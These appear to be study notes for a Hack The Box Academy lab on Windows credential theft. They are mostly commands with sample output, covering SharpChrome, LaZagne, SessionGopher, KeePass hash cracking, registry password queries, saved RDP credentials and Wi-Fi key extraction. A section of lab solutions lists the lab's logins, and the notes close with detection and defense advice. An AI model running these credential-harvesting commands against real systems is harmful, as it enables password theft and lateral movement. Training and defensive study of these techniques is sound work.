# Further Credential Theft

## 🎯 Overview

**Advanced credential theft techniques** go beyond basic file searches to extract stored credentials from **browsers**, **password managers**, **registry storage**, **saved RDP sessions**, and **wireless profiles**. These methods target credentials stored by applications, Windows features, and user convenience configurations.

## 💾 Cmdkey Saved Credentials

### Listing Stored Credentials
```cmd
# List saved credentials for Terminal Services/RDP
cmdkey /list

# Example output:
Target: LegacyGeneric:target=TERMSRV/SQL01
Type: Generic
User: inlanefreight\bob
```

### Exploiting Saved Credentials
```cmd
# Use saved credentials with runas
runas /savecred /user:inlanefreight\bob "COMMAND HERE"

# RDP connections will automatically use saved credentials
# Target system: SQL01 with saved bob credentials
```

## 🌐 Browser Credentials

### Chrome Credential Extraction
```powershell
# Use SharpChrome to extract saved passwords
.\SharpChrome.exe logins /unprotect

# Example output:
--- Chrome Credential ---
file_path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data
signon_realm: https://vc01.inlanefreight.local/
username: bob@inlanefreight.local
password: Welcome1
```

### Detection Considerations
```cmd
# Browser credential extraction generates events:
- Event ID 4983: Process creation
- Event ID 4688: Process execution
- Event ID 16385: Chrome-specific events
```

## 🔐 Password Managers

### KeePass Database Cracking
```bash
# Extract hash from .kdbx file
python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx

# Example hash output:
ILFREIGHT_Help_Desk:$keepass$*2*60000*222*f49632ef7dae20e5a670bdec2365d5820ca1718877889f44e2c4c202c62f5fd5*...

# Crack with Hashcat (mode 13400)
hashcat -m 13400 keepass_hash /opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt

# Example result:
$keepass$*2*60000*222*...:panther1
```

### Password Manager Targeting
```cmd
# Common password manager files:
*.kdbx          # KeePass databases
*.1pif          # 1Password exports
*.psafe3        # Password Safe
*.bks           # Various backup files
```

## 📧 Email Credential Mining

### MailSniper for Exchange
```powershell
# Search Exchange mailboxes for credentials
# Target terms: "pass", "creds", "credentials", "password"
# Requires domain user context with Exchange access
```

## 🛠️ LaZagne - Automated Extraction

### Comprehensive Credential Harvesting
```cmd
# Run all LaZagne modules
.\lazagne.exe all

# Example output:
########## User: jordan ##########

------------------- Winscp passwords -----------------
[+] Password found !!!
URL: transfer.inlanefreight.local
Login: root
Password: Summer2020!
Port: 22

------------------- Credman passwords -----------------
[+] Password found !!!
URL: dev01.dev.inlanefreight.local
Login: jordan_adm
Password: ! Q A Z z a q 1
```

### LaZagne Module Categories
```cmd
# Available modules:
chats          # Chat applications
mails          # Email clients
browsers       # Web browsers
sysadmin       # System admin tools
databases      # Database clients
windows        # Windows-specific storage
wifi           # Wireless profiles
memory         # Memory dumps
```

## 🔧 SessionGopher

### Remote Access Tool Credentials
```powershell
# Extract PuTTY, WinSCP, FileZilla, RDP credentials
Import-Module .\SessionGopher.ps1
Invoke-SessionGopher -Target WINLPE-SRV01

# Example output:
WinSCP Sessions
Source   : WINLPE-SRV01\htb-student
Session  : Default%20Settings

PuTTY Sessions
Source   : WINLPE-SRV01\htb-student
Session  : nix03
Hostname : nix03.inlanefreight.local

SuperPuTTY Sessions
Source        : WINLPE-SRV01\htb-student
SessionId     : NIX03
Host          : nix03.inlanefreight.local
Username      : srvadmin
Port          : 22
```

## 🗝️ Registry Credential Storage

### Windows AutoLogon
```cmd
# Check AutoLogon configuration
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

# Key values to check:
AutoAdminLogon     # 1 = enabled
DefaultUserName    # Username for autologon
DefaultPassword    # Cleartext password

# Example output:
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    htb-student
DefaultPassword   REG_SZ    HTB_@cademy_stdnt!
```

### PuTTY Proxy Credentials
```cmd
# Enumerate PuTTY sessions
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions

# Check specific session for proxy credentials
reg query "HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\kali%20ssh"

# Look for proxy configuration:
ProxyMethod       # 5 = HTTP proxy with credentials
ProxyHost         # Proxy server
ProxyUsername     # Proxy username
ProxyPassword     # Cleartext proxy password

# Example:
ProxyUsername    REG_SZ    administrator
ProxyPassword    REG_SZ    1_4m_th3_@cademy_4dm1n!
```

## 📡 WiFi Password Extraction

### Wireless Profile Enumeration
```cmd
# List saved wireless networks
netsh wlan show profile

# Example output:
Profiles on interface Wi-Fi:
User profiles
-------------
    All User Profile     : Smith Cabin
    All User Profile     : ilfreight_corp
```

### Wireless Password Retrieval
```cmd
# Extract WiFi password
netsh wlan show profile ilfreight_corp key=clear

# Key information in output:
Security settings
-----------------
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Security key           : Present
    Key Content            : ILFREIGHTWIFI-CORP123908!
```

## 🎯 HTB Academy Lab Solutions

### Lab Environment Overview
- **Various RDP credentials**: `jordan:HTB_@cademy_j0rdan!`, `htb-student:HTB_@cademy_stdnt!`
- **Multiple objectives**: SQL sa password, RDP credentials, vCenter password, FTP password

### Lab 1: SQL sa Password (as jordan)
```cmd
# Objective: Retrieve sa password for SQL01.inlanefreight.local
# Methods: LaZagne, SessionGopher, registry search, browser credentials
# Check saved credentials and password managers
```

### Lab 2: RDP User Discovery (as htb-student)
```cmd
# Objective: Find user with stored RDP credentials for WEB01
# Method: cmdkey /list, SessionGopher, registry enumeration
cmdkey /list
# Look for TERMSRV/WEB01 entries
```

### Lab 3: vCenter Password (as htb-student)
```cmd
# Objective: Find password for https://vc01.inlanefreight.local/ui/login
# Method: SharpChrome browser credential extraction
.\SharpChrome.exe logins /unprotect
# Look for vc01.inlanefreight.local entries
```

### Lab 4: FTP Password (as htb-student)
```cmd
# Objective: Find password for ftp.ilfreight.local
# Methods: LaZagne all modules, SessionGopher, browser extraction
.\lazagne.exe all
# Check WinSCP, FileZilla, browser saved passwords
```

## 🔄 Advanced Techniques

### Comprehensive Enumeration Strategy
```powershell
# 1. Automated extraction
.\lazagne.exe all

# 2. Session-specific tools
Invoke-SessionGopher -Target localhost

# 3. Browser credentials
.\SharpChrome.exe logins /unprotect

# 4. Registry searches
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# 5. Saved credentials
cmdkey /list

# 6. WiFi profiles
netsh wlan show profile
```

### Manual Registry Hunting
```cmd
# Additional registry locations:
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password
HKEY_LOCAL_MACHINE\SYSTEM\Current001\Services\SNMP
```

## ⚠️ Detection & Defense

### Detection Indicators
```cmd
# Monitor for:
- Browser database access patterns
- Registry queries for credential storage locations
- KeePass database file access
- SessionGopher PowerShell execution
- LaZagne process execution
- Unusual credential manager access
```

### Defensive Measures
```cmd
# Security practices:
- Disable AutoLogon or use encrypted storage
- Regular password manager audits
- Browser security policies
- Monitor credential extraction tools
- Network segregation for admin tools
- Least privilege for saved credentials
```

## 💡 Key Takeaways

1. **Multiple credential storage mechanisms** exist beyond files
2. **Browser credentials** are easily extractable with tools
3. **Password managers** can be cracked if master passwords are weak
4. **Registry storage** often contains cleartext credentials
5. **Automated tools** like LaZagne provide comprehensive extraction
6. **WiFi passwords** can enable lateral network access

---

*Further credential theft techniques exploit various Windows credential storage mechanisms, providing multiple vectors for privilege escalation and lateral movement.* 